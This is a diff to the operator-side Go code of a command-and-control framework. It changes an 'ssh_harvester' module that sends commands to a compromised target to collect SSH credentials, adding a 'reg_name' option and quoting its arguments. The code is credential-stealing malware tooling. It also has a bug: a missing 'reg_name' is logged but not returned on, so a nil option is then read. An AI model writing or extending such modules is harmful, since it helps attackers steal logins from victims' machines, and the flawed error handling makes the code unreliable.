@@ -5,6 +5,7 @@ package cc
 
 import (
 	"fmt"
+	"strconv"
 
 	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 )
@@ -19,7 +20,13 @@ func module_ssh_harvester() {
 		LogError("code_pattern not specified")
 		return
 	}
-	err := SendCmdToCurrentTarget(fmt.Sprintf("%s --code_pattern %s", emp3r0r_def.C2CmdSSHHarvester, code_pattern_opt.Val), "")
+
+	reg_name_opt, ok := CurrentModuleOptions["reg_name"]
+	if !ok {
+		LogError("reg_name not specified")
+	}
+	err := SendCmdToCurrentTarget(fmt.Sprintf("%s --code_pattern %s --reg_name %s",
+		emp3r0r_def.C2CmdSSHHarvester, strconv.Quote(code_pattern_opt.Val), strconv.Quote(reg_name_opt.Val)), "")
 	if err != nil {
 		LogError("SendCmd: %v", err)
 		return
